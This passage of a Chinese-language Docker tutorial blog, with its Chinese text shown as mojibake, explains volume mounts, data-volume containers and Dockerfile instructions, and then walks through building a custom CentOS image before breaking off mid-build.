<p>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯åœ¨ Docker ä¸­åˆ›å»ºå¹¶è¿è¡Œä¸€ä¸ª MySQL å®¹å™¨ï¼ŒåŒæ—¶å°†ä¸»æœºä¸Šçš„ç›®å½•æŒ‚è½½åˆ°å®¹å™¨ä¸­ï¼Œä»¥ä¾¿äºé…ç½®å’Œä¿å­˜æ•°æ®ã€‚</p>
<h2 id="3ã€åŒ¿åå’Œå…·åæŒ‚è½½"><a href="#3ã€åŒ¿åå’Œå…·åæŒ‚è½½" class="headerlink" title="3ã€åŒ¿åå’Œå…·åæŒ‚è½½"></a>3ã€åŒ¿åå’Œå…·åæŒ‚è½½</h2><ul>
<li>-v å®¹å™¨å†…è·¯å¾„         #åŒ¿åæŒ‚è½½</li>
<li>-v å·å:å®¹å™¨å†…è·¯å¾„      #å…·åæŒ‚è½½</li>
<li>-v &#x2F;å®¿ä¸»æœºè·¯å¾„:å®¹å™¨å†…è·¯å¾„   #æŒ‡å®šè·¯å¾„æŒ‚è½½</li>
</ul>
<h2 id="4ã€åˆè¯†Dockerfile"><a href="#4ã€åˆè¯†Dockerfile" class="headerlink" title="4ã€åˆè¯†Dockerfile"></a>4ã€åˆè¯†Dockerfile</h2><p>DockerFile æ˜¯ç”¨æ¥æ„å»ºDockeré•œåƒçš„æ„å»ºæ–‡ä»¶ï¼Œæ˜¯ç”±ä¸€äº›åˆ—å‘½ä»¤å’Œå‚æ•°æ„æˆçš„è„šæœ¬ã€‚</p>
<p>æˆ‘ä»¬åœ¨è¿™é‡Œï¼Œå…ˆä½“éªŒä¸‹ï¼Œåé¢æˆ‘ä»¬ä¼šè¯¦ç»†è®²è§£ DockerFile ï¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1.è¿›å…¥å®¿ä¸»æœºç›®å½•ï¼Œåœ¨ç›®å½•ä¸‹å†åˆ›å»ºä¸€ä¸ªç›®å½•docker-test-volumeï¼Œåœ¨è¿™ä¸ªæ–°å»ºç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶dockerfile</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test<span class="comment"># mkdir docker-test-volumn</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test<span class="comment"># cd docker-test-volumn/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.ç¼–è¾‘dockerfile1è¿™ä¸ªæ–‡ä»¶</span></span><br><span class="line"><span class="comment">#è¯´æ˜ï¼šåœ¨ç¼–å†™DockerFileæ–‡ä»¶ä¸­ä½¿ç”¨ VOLUME æŒ‡ä»¤æ¥ç»™é•œåƒæ·»åŠ ä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®å·</span></span><br><span class="line"><span class="comment">#å‡ºäºå¯ç§»æ¤å’Œåˆ†äº«çš„è€ƒè™‘ï¼Œæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„ -v ä¸»æœºç›®å½•:å®¹å™¨ç›®å½• è¿™ç§æ–¹å¼ä¸èƒ½å¤Ÿç›´æ¥åœ¨ DockerFileä¸­å®ç°</span></span><br><span class="line"><span class="comment">#ç”±äºå®¿ä¸»æœºç›®å½•æ˜¯ä¾èµ–äºç‰¹å®šå®¿ä¸»æœºçš„ï¼Œå¹¶ä¸èƒ½å¤Ÿä¿è¯åœ¨æ‰€æœ‰å®¿ä¸»æœºä¸Šéƒ½å­˜åœ¨è¿™æ ·çš„ç‰¹å®šç›®å½•</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># vim dockerfile</span></span><br><span class="line">FROM centos</span><br><span class="line">VOLUME [<span class="string">&quot;volume1&quot;</span>,<span class="string">&quot;volume2&quot;</span>]</span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;-----end-----&quot;</span></span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#3.buildåç”Ÿæˆé•œåƒï¼Œè·å¾—ä¸€ä¸ªæ–°é•œåƒ my-centos</span></span><br><span class="line"><span class="comment">#æ³¨æ„æœ€åæœ‰ä¸€ä¸ª.</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker build -t my-centos .</span></span><br><span class="line">[+] Building 0.3s (5/5) FINISHED                                                                    docker:default</span><br><span class="line"> =&gt; [internal] load build definition from dockerfile                                                          0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 123B                                                                          0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:latest                                              0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                             0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                               0.0s</span><br><span class="line"> =&gt; [1/1] FROM docker.io/library/centos:latest                                                                0.0s</span><br><span class="line"> =&gt; exporting to image                                                                                        0.0s</span><br><span class="line"> =&gt; =&gt; exporting layers                                                                                       0.0s</span><br><span class="line"> =&gt; =&gt; writing image sha256:f0839ab2b921916360f89feb21d60cec317c13b76274d4c6de29d9d6bb404f52                  0.0s</span><br><span class="line"> =&gt; =&gt; naming to docker.io/library/my-centos                                                                  0.0s</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY   TAG       IMAGE ID       CREATED             SIZE</span><br><span class="line">mytomcat     1.0       c4cc1b3de0ff   About an hour ago   474MB</span><br><span class="line">tomcat       latest    7f14c7d5cf60   4 days ago          469MB</span><br><span class="line">redis        latest    590b81f2fea1   7 weeks ago         117MB</span><br><span class="line">mysql        5.7       5107333e08a8   9 months ago        501MB</span><br><span class="line">my-centos    latest    f0839ab2b921   3 years ago         231MB</span><br><span class="line">centos       latest    5d0da3dc9764   3 years ago         231MB</span><br><span class="line"></span><br><span class="line"><span class="comment">#4.å¯åŠ¨å®¹å™¨ å‘ç°æ•°æ®å·ç›®å½•volume1å’Œvolume2</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker run -it f0839ab2b921 /bin/bash</span></span><br><span class="line">[root@20aafb95c23c /]<span class="comment"># ls</span></span><br><span class="line">bin  etc   lib	  lost+found  mnt  proc  run   srv  tmp  var	  volumn2</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr  volumn1</span><br><span class="line"><span class="comment">#5.è¿›å…¥å®¹å™¨ï¼Œè¿›å…¥volume1ç›®å½•ï¼Œ1.txtæ–‡ä»¶ï¼Œç„¶åé€€å‡ºå®¹å™¨</span></span><br><span class="line">[root@20aafb95c23c /]<span class="comment"># cd volumn1</span></span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># ls</span></span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># touch 1.txt</span></span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># ls</span></span><br><span class="line">1.txt</span><br><span class="line">[root@20aafb95c23c volumn1]<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="comment">#é—®é¢˜:é€šè¿‡ä¸Šè¿°æ­¥éª¤ï¼Œå®¹å™¨å†…çš„å·ç›®å½•åœ°å€å°±å·²ç»çŸ¥é“äº†ï¼Œä½†æ˜¯å¯¹åº”çš„ä¸»æœºç›®å½•åœ°å€åœ¨å“ªé‡Œå‘¢ï¼Ÿ</span></span><br><span class="line"><span class="comment">#6.æŸ¥çœ‹å®¹å™¨ä¿¡æ¯</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID   IMAGE          COMMAND       CREATED              STATUS                      PORTS     NAMES</span><br><span class="line">20aafb95c23c   f0839ab2b921   <span class="string">&quot;/bin/bash&quot;</span>   About a minute ago   Exited (0) 23 seconds ago             busy_greider</span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volumn<span class="comment"># docker inspect f0839ab2b921</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/25d8e823103f845e6a23f7221dc68d5a--07be--image-20240922170917802.png" alt="image-20240922170917802"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#8ã€å‘ç°å®¿ä¸»æœºæ–‡ä»¶</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># cd /var/lib/docker/volumes/5408b9e55fc0210903273841542b6fdb1cf0e3e1286994f19d08db8c78c6963b/_data</span></span><br><span class="line">root@VM-16-10-ubuntu:/var/lib/docker/volumes/5408b9e55fc0210903273841542b6fdb1cf0e3e1286994f19d08db8c78c6963b/_data<span class="comment"># ls</span></span><br><span class="line">1.txt</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šå¦‚æœè®¿é—®å‡ºç°äº† cannot open directory: Permission denied</p>
<p>è§£å†³åŠæ³•ï¼šåœ¨æŒ‚è½½ç›®å½•åå¤šåŠ ä¸€ä¸ª â€“privileged&#x3D;trueå‚æ•°å³å¯</p>
<h2 id="5ã€æ•°æ®å·å®¹å™¨"><a href="#5ã€æ•°æ®å·å®¹å™¨" class="headerlink" title="5ã€æ•°æ®å·å®¹å™¨"></a>5ã€æ•°æ®å·å®¹å™¨</h2><p>å‘½åçš„å®¹å™¨æŒ‚è½½æ•°æ®å·ï¼Œå…¶ä»–å®¹å™¨é€šè¿‡æŒ‚è½½è¿™ä¸ªï¼ˆçˆ¶å®¹å™¨ï¼‰å®ç°æ•°æ®å…±äº«ï¼ŒæŒ‚è½½æ•°æ®å·çš„å®¹å™¨ï¼Œç§°ä¹‹ä¸º</p>
<p>æ•°æ®å·å®¹å™¨ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨ä¸Šä¸€æ­¥çš„é•œåƒï¼šmy-centos ä¸ºæ¨¡æ¿ï¼Œè¿è¡Œå®¹å™¨ docker01ï¼Œdocker02ï¼Œdocker03ï¼Œä»–</p>
<p>ä»¬éƒ½ä¼šå…·æœ‰å®¹å™¨å·volume1å’Œvolume2</p>
<p><strong>æˆ‘ä»¬æ¥æµ‹è¯•ä¸‹ï¼Œå®¹å™¨é—´ä¼ é€’å…±äº«</strong></p>
<ol>
<li><p>ç”¨my-centosé•œåƒï¼Œå¯åŠ¨å®¹å™¨docker01ï¼Œåœ¨volume2ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶from_docker01.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it --name docker01 my-centos</span></span><br><span class="line">[root@a31ad75c98e6 /]<span class="comment"># cd volume2</span></span><br><span class="line">[root@a31ad75c98e6 volume2]<span class="comment"># touch from_docker01.txt</span></span><br><span class="line">[root@a31ad75c98e6 volume2]<span class="comment"># ls</span></span><br><span class="line">from_docker01.txt</span><br></pre></td></tr></table></figure>
</li>
<li><p>é€€å‡ºä¸åœæ­¢å®¹å™¨ï¼šctrl+p+q</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># root@VM-16-10-ubuntu:/home/ubuntu# docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE       COMMAND                  CREATED              STATUS              PORTS     NAMES</span><br><span class="line">a31ad75c98e6   my-centos   <span class="string">&quot;/bin/sh -c /bin/bash&quot;</span>   About a minute ago   Up About a minute             docker01</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç”¨my-centosé•œåƒï¼Œå¯åŠ¨å®¹å™¨docker02ï¼Œè®©docker02ç»§æ‰¿docker01  <code>--volumes-from</code></p>
<p>åœ¨volume2ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶from_docker02.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu<span class="comment"># docker run -it --name docker02 --volumes-from docker01 my-centos</span></span><br><span class="line">[root@de7b3fc3cf53 /]<span class="comment"># cd volume2</span></span><br><span class="line">[root@de7b3fc3cf53 volume2]<span class="comment"># ls</span></span><br><span class="line">from_docker01.txt</span><br></pre></td></tr></table></figure></li>
</ol>
<p><strong>å®¹å™¨ä¹‹é—´é…ç½®ä¿¡æ¯çš„ä¼ é€’ï¼Œæ•°æ®å·çš„ç”Ÿå‘½å‘¨æœŸä¸€ç›´æŒç»­åˆ°æ²¡æœ‰å®¹å™¨ä½¿ç”¨å®ƒä¸ºæ­¢ã€‚</strong></p>
<p><strong>å­˜å‚¨åœ¨æœ¬æœºçš„æ–‡ä»¶åˆ™ä¼šä¸€ç›´ä¿ç•™ï¼</strong></p>
<h1 id="å…«ã€dockerfile"><a href="#å…«ã€dockerfile" class="headerlink" title="å…«ã€dockerfile"></a>å…«ã€dockerfile</h1><p>å¤§å®¶æƒ³æƒ³ï¼ŒNginxï¼Œtomcatï¼Œmysql è¿™äº›é•œåƒéƒ½æ˜¯å“ªé‡Œæ¥çš„ï¼Ÿå®˜æ–¹èƒ½å†™ï¼Œæˆ‘ä»¬ä¸èƒ½å†™å—ï¼Ÿ</p>
<p>æˆ‘ä»¬è¦ç ”ç©¶è‡ªå·±å¦‚ä½•åšä¸€ä¸ªé•œåƒï¼Œè€Œä¸”æˆ‘ä»¬å†™çš„å¾®æœåŠ¡é¡¹ç›®ä»¥åŠspringbootæ‰“åŒ…ä¸Šäº‘éƒ¨ç½²ï¼ŒDockerå°±æ˜¯</p>
<p>æœ€æ–¹ä¾¿çš„ã€‚</p>
<p>å¾®æœåŠ¡æ‰“åŒ…æˆé•œåƒï¼Œä»»ä½•è£…äº†Dockerçš„åœ°æ–¹ï¼Œéƒ½å¯ä»¥ä¸‹è½½ä½¿ç”¨ï¼Œæå…¶çš„æ–¹ä¾¿ã€‚</p>
<p>æµç¨‹ï¼šå¼€å‘åº”ç”¨&#x3D;&gt;DockerFile&#x3D;&gt;æ‰“åŒ…ä¸ºé•œåƒ&#x3D;&gt;ä¸Šä¼ åˆ°ä»“åº“ï¼ˆç§æœ‰ä»“åº“ï¼Œå…¬æœ‰ä»“åº“ï¼‰&#x3D;&gt; ä¸‹è½½é•œåƒ &#x3D;&gt; å¯åŠ¨</p>
<p>è¿è¡Œã€‚</p>
<p>è¿˜å¯ä»¥æ–¹ä¾¿ç§»æ¤ï¼</p>
<h2 id="1ã€ä»€ä¹ˆæ˜¯dockerfile"><a href="#1ã€ä»€ä¹ˆæ˜¯dockerfile" class="headerlink" title="1ã€ä»€ä¹ˆæ˜¯dockerfile"></a>1ã€ä»€ä¹ˆæ˜¯dockerfile</h2><p>dockerfifileæ˜¯ç”¨æ¥æ„å»ºDockeré•œåƒçš„æ„å»ºæ–‡ä»¶ï¼Œæ˜¯ç”±ä¸€ç³»åˆ—å‘½ä»¤å’Œå‚æ•°æ„æˆçš„è„šæœ¬ã€‚</p>
<p>æ„å»ºæ­¥éª¤ï¼š</p>
<ol>
<li>ç¼–å†™DockerFileæ–‡ä»¶</li>
<li>docker build æ„å»ºé•œåƒ</li>
<li>docker run</li>
</ol>
<p>dockerfifileæ–‡ä»¶æˆ‘ä»¬åˆšæ‰å·²ç»ç¼–å†™è¿‡äº†ä¸€æ¬¡ï¼Œè¿™é‡Œæˆ‘ä»¬ç»§ç»­ä½¿ç”¨ centos æ¥çœ‹ï¼</p>
<p><a href="https://hub.docker.com/_/centos">https://hub.docker.com/_/centos</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/56b9338be70822d6aaca2a507ee2b04f--4fcc--image-20240922172857074.png" alt="image-20240922172857074"></p>
<h2 id="2ã€dockerfileçš„æ„å»ºè¿‡ç¨‹"><a href="#2ã€dockerfileçš„æ„å»ºè¿‡ç¨‹" class="headerlink" title="2ã€dockerfileçš„æ„å»ºè¿‡ç¨‹"></a>2ã€dockerfileçš„æ„å»ºè¿‡ç¨‹</h2><p><strong>åŸºç¡€çŸ¥è¯†</strong></p>
<ol>
<li>æ¯æ¡ä¿ç•™å­—æŒ‡ä»¤éƒ½å¿…é¡»ä¸ºå¤§å†™å­—æ¯ä¸”åé¢è¦è·Ÿéšè‡³å°‘ä¸€ä¸ªå‚æ•°</li>
<li>æŒ‡ä»¤æŒ‰ç…§ä»ä¸Šåˆ°ä¸‹ï¼Œé¡ºåºæ‰§è¡Œ</li>
<li># è¡¨ç¤ºæ³¨é‡Š</li>
<li>æ¯æ¡æŒ‡ä»¤éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„é•œåƒå±‚ï¼Œå¹¶å¯¹é•œåƒè¿›è¡Œæäº¤</li>
</ol>
<p><strong>æµç¨‹ï¼š</strong></p>
<ol>
<li>dockerä»åŸºç¡€é•œåƒè¿è¡Œä¸€ä¸ªå®¹å™¨</li>
<li>æ‰§è¡Œä¸€æ¡æŒ‡ä»¤å¹¶å¯¹å®¹å™¨åšå‡ºä¿®æ”¹</li>
<li>æ‰§è¡Œç±»ä¼¼ docker commit çš„æ“ä½œæäº¤ä¸€ä¸ªæ–°çš„é•œåƒå±‚</li>
<li>Dockerå†åŸºäºåˆšæäº¤çš„é•œåƒè¿è¡Œä¸€ä¸ªæ–°å®¹å™¨</li>
<li>æ‰§è¡Œdockerfifileä¸­çš„ä¸‹ä¸€æ¡æŒ‡ä»¤ç›´åˆ°æ‰€æœ‰æŒ‡ä»¤éƒ½æ‰§è¡Œå®Œæˆï¼</li>
</ol>
<p><strong>è¯´æ˜ï¼š</strong></p>
<p>ä»åº”ç”¨è½¯ä»¶çš„è§’åº¦æ¥çœ‹ï¼ŒDockerFileï¼Œdockeré•œåƒä¸dockerå®¹å™¨åˆ†åˆ«ä»£è¡¨è½¯ä»¶çš„ä¸‰ä¸ªä¸åŒé˜¶æ®µã€‚</p>
<ul>
<li>DockerFile æ˜¯è½¯ä»¶çš„åŸææ–™ ï¼ˆä»£ç ï¼‰</li>
<li>Docker é•œåƒåˆ™æ˜¯è½¯ä»¶çš„äº¤ä»˜å“ ï¼ˆ.apkï¼‰</li>
<li>Docker å®¹å™¨åˆ™æ˜¯è½¯ä»¶çš„è¿è¡ŒçŠ¶æ€ ï¼ˆå®¢æˆ·ä¸‹è½½å®‰è£…æ‰§è¡Œï¼‰</li>
</ul>
<p><strong>DockerFile é¢å‘å¼€å‘ï¼ŒDockeré•œåƒæˆä¸ºäº¤ä»˜æ ‡å‡†ï¼ŒDockerå®¹å™¨åˆ™æ¶‰åŠéƒ¨ç½²ä¸è¿ç»´ï¼Œä¸‰è€…ç¼ºä¸€ä¸å¯ï¼</strong></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-22/f5913e68843f79d565a56a4ef914875c--d5b3--image-20240922173620477.png" alt="image-20240922173620477"></p>
<p>DockerFileï¼šéœ€è¦å®šä¹‰ä¸€ä¸ªDockerFileï¼ŒDockerFileå®šä¹‰äº†è¿›ç¨‹éœ€è¦çš„ä¸€åˆ‡ä¸œè¥¿ã€‚DockerFileæ¶‰åŠçš„å†…å®¹</p>
<p>åŒ…æ‹¬æ‰§è¡Œä»£ç æˆ–è€…æ˜¯æ–‡ä»¶ã€ç¯å¢ƒå˜é‡ã€ä¾èµ–åŒ…ã€è¿è¡Œæ—¶ç¯å¢ƒã€åŠ¨æ€é“¾æ¥åº“ã€æ“ä½œç³»ç»Ÿçš„å‘è¡Œç‰ˆã€æœåŠ¡è¿›</p>
<p>ç¨‹å’Œå†…æ ¸è¿›ç¨‹ï¼ˆå½“å¼•ç”¨è¿›è¡Œéœ€è¦å’Œç³»ç»ŸæœåŠ¡å’Œå†…æ ¸è¿›ç¨‹æ‰“äº¤é“ï¼Œè¿™æ—¶éœ€è¦è€ƒè™‘å¦‚ä½•è®¾è®¡ namespaceçš„æƒ</p>
<p>é™æ§åˆ¶ï¼‰ç­‰ç­‰ã€‚</p>
<p>Dockeré•œåƒï¼šåœ¨DockerFile å®šä¹‰äº†ä¸€ä¸ªæ–‡ä»¶ä¹‹åï¼ŒDocker build æ—¶ä¼šäº§ç”Ÿä¸€ä¸ªDockeré•œåƒï¼Œå½“è¿è¡Œ</p>
<p>Docker é•œåƒæ—¶ï¼Œä¼šçœŸæ­£å¼€å§‹æä¾›æœåŠ¡ï¼›</p>
<p>Dockerå®¹å™¨ï¼šå®¹å™¨æ˜¯ç›´æ¥æä¾›æœåŠ¡çš„ã€‚</p>
<h2 id="3ã€DockerfileæŒ‡ä»¤"><a href="#3ã€DockerfileæŒ‡ä»¤" class="headerlink" title="3ã€DockerfileæŒ‡ä»¤"></a>3ã€DockerfileæŒ‡ä»¤</h2><p>å…³é”®å­—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">FROM        <span class="comment"># åŸºç¡€é•œåƒï¼Œå½“å‰æ–°é•œåƒæ˜¯åŸºäºå“ªä¸ªé•œåƒçš„</span></span><br><span class="line">MAINTAINER  <span class="comment"># maintainer é•œåƒç»´æŠ¤è€…çš„å§“åå’Œé‚®ç®±åœ°å€</span></span><br><span class="line">RUN         <span class="comment"># å®¹å™¨æ„å»ºæ—¶éœ€è¦è¿è¡Œçš„å‘½ä»¤</span></span><br><span class="line">EXPOSE      <span class="comment"># å½“å‰å®¹å™¨å¯¹å¤–æš´éœ²å‡ºçš„ç«¯å£</span></span><br><span class="line">WORKDIR	    <span class="comment"># æŒ‡å®šåœ¨åˆ›å»ºå®¹å™¨åï¼Œç»ˆç«¯é»˜è®¤ç™»å½•è¿›æ¥çš„å·¥ä½œç›®å½•ï¼Œä¸€ä¸ªè½è„šç‚¹</span></span><br><span class="line">ENV         <span class="comment"># ç”¨æ¥åœ¨æ„å»ºé•œåƒè¿‡ç¨‹ä¸­è®¾ç½®ç¯å¢ƒå˜é‡</span></span><br><span class="line">ADD         <span class="comment"># å°†å®¿ä¸»æœºç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·è´è¿›é•œåƒä¸”ADDå‘½ä»¤ä¼šè‡ªåŠ¨å¤„ç†URLå’Œè§£å‹tarå‹ç¼©åŒ…</span></span><br><span class="line">COPY        <span class="comment"># ç±»ä¼¼ADDï¼Œæ‹·è´æ–‡ä»¶å’Œç›®å½•åˆ°é•œåƒä¸­ï¼ä½†æ˜¯æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹æ–‡ä»¶ï¼Œä¹Ÿä¸èƒ½è®¿é—®ç½‘ç»œèµ„æº</span></span><br><span class="line">VLIUME      <span class="comment"># å®¹å™¨æ•°æ®å·ï¼Œç”¨äºæ•°æ®ä¿å­˜å’ŒæŒä¹…åŒ–å·¥ä½œ</span></span><br><span class="line">CMD         <span class="comment"># æŒ‡å®šä¸€ä¸ªå®¹å™¨å¯åŠ¨æ—¶è¦è¿è¡Œçš„å‘½ä»¤ï¼ŒdockerFileä¸­å¯ä»¥æœ‰å¤šä¸ªCMDæŒ‡ä»¤ï¼Œä½†åªæœ‰æœ€ åä¸€ä¸ªç”Ÿæ•ˆï¼</span></span><br><span class="line">ENTRYPOINT  <span class="comment"># entrypoint æŒ‡å®šä¸€ä¸ªå®¹å™¨å¯åŠ¨æ—¶è¦è¿è¡Œçš„å‘½ä»¤ï¼å’ŒCMDä¸€æ · å¯ä»¥è¿½åŠ å‘½ä»¤</span></span><br><span class="line">ONBUILD     <span class="comment"># å½“æ„å»ºä¸€ä¸ªè¢«ç»§æ‰¿çš„DockerFileæ—¶è¿è¡Œå‘½ä»¤ï¼Œçˆ¶é•œåƒåœ¨è¢«å­é•œåƒç»§æ‰¿åï¼Œçˆ¶é•œåƒçš„ ONBUILDè¢«è§¦å‘</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-23/b691757752d20b3ed9330eeecc587ec9--0eed--image-20240923190649837.png" alt="image-20240923190649837"></p>
<h2 id="4ã€å®æˆ˜æµ‹è¯•"><a href="#4ã€å®æˆ˜æµ‹è¯•" class="headerlink" title="4ã€å®æˆ˜æµ‹è¯•"></a>4ã€å®æˆ˜æµ‹è¯•</h2><p>Docker Hub ä¸­99% çš„é•œåƒéƒ½æ˜¯é€šè¿‡åœ¨baseé•œåƒï¼ˆScratchï¼‰ä¸­å®‰è£…å’Œé…ç½®éœ€è¦çš„è½¯ä»¶æ„å»ºå‡ºæ¥çš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-23/d3d17cf58aff5777ea3ecad37eb764d4--fd02--image-20240923190944663.png" alt="image-20240923190944663"></p>
<blockquote>
<p>è‡ªå®šä¸€ä¸ªcentosé•œåƒ</p>
</blockquote>
<ol>
<li><p>ç¼–å†™dockerfile</p>
<p>ç›´æ¥è¿è¡Œcentosçš„å®˜æ–¹é•œåƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker run -it centos /bin/bash</span></span><br><span class="line">Unable to find image <span class="string">&#x27;centos:latest&#x27;</span> locally</span><br><span class="line">latest: Pulling from library/centos</span><br><span class="line">a1d0c7532777: Already exists </span><br><span class="line">Digest: sha256:a27fd8080b517143cbbbab9dfb7c8571c40d67d534bbdee55bd6c473f432b177</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> centos:latest</span><br><span class="line">[root@bcf6eb6bf82f /]<span class="comment"># vim a</span></span><br><span class="line">bash: vim: <span class="built_in">command</span> not found</span><br><span class="line">[root@bcf6eb6bf82f /]<span class="comment"># ifconfig</span></span><br><span class="line">bash: ifconfig: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>å‘ç°ï¼Œä¸æ”¯æŒvimå’Œifconfigå‘½ä»¤ï¼Œç™»é™†åçš„é»˜è®¤è·¯å¾„æ˜¯&#x2F;</p>
<p>ç›®çš„ï¼šä½¿æˆ‘ä»¬è‡ªå·±çš„é•œåƒå…·å¤‡å¦‚ä¸‹ï¼šç™»é™†åçš„é»˜è®¤è·¯å¾„ã€vimç¼–è¾‘å™¨ã€æŸ¥çœ‹ç½‘ç»œé…ç½®ifconfifigæ”¯æŒ</p>
<p>å‡†å¤‡ç¼–å†™DockerFlieæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># vim mydockerfile-centos</span></span><br><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># cat mydockerfile-centos </span></span><br><span class="line">FROM centos</span><br><span class="line">MAINTATINER 6pc1&lt;pc6pc1@qq.com&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR <span class="variable">$MYPATH</span></span><br><span class="line"></span><br><span class="line">RUN <span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum -y install vim</span><br><span class="line"></span><br><span class="line">RUN yun -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="variable">$MYPATH</span></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">&quot;----end------&quot;</span></span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼šdockerfileä¸­ç›´æ¥<code>RUN yum -y install vim</code>å¯èƒ½ä¼šæŠ¥ä¸‹é¢é”™è¯¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#0 1.607 Error: Failed to download metadata for repo &#x27;appstream&#x27;: Cannot prepare internal mirrorlist: No URLs in mirrorlist</span></span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ä¸‹é¢è¿™äº›ï¼Œå…¶å®å°±æ˜¯ä¸ºäº†è®©<code>RUN yum -y install vim</code>å¯ä»¥æ‰§è¡ŒæˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">RUN <span class="built_in">cd</span> /etc/yum.repos.d/</span><br><span class="line">RUN sed -i <span class="string">&#x27;s/mirrorlist/#mirrorlist/g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN sed -i <span class="string">&#x27;s|#baseurl=http://mirror.centos.org|baseurl=http://vault.centos.org|g&#x27;</span> /etc/yum.repos.d/CentOS-*</span><br><span class="line">RUN yum -y install vim</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ„å»º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@VM-16-10-ubuntu:/home/ubuntu/test/docker-test-volume<span class="comment"># docker build -f mydockerfile-centos -t mycentos:1.0 .</span></span><br><span class="line">[+] Building 4.3s (11/11) FINISHED                                                                  docker:default</span><br><span class="line"> =&gt; [internal] load build definition from mydockerfile-centos                                                 0.0s</span><br><span class="line"> =&gt; =&gt; transferring dockerfile: 452B                                                                          0.0s</span><br><span class="line"> =&gt; [internal] load metadata <span class="keyword">for</span> docker.io/library/centos:latest                                              0.0s</span><br><span class="line"> =&gt; [internal] load .dockerignore                                                                             0.0s</span><br><span class="line"> =&gt; =&gt; transferring context: 2B                                                                               0.0s</span><br><span class="line"> =&gt; [1/7] FROM docker.io/library/centos:latest                                                                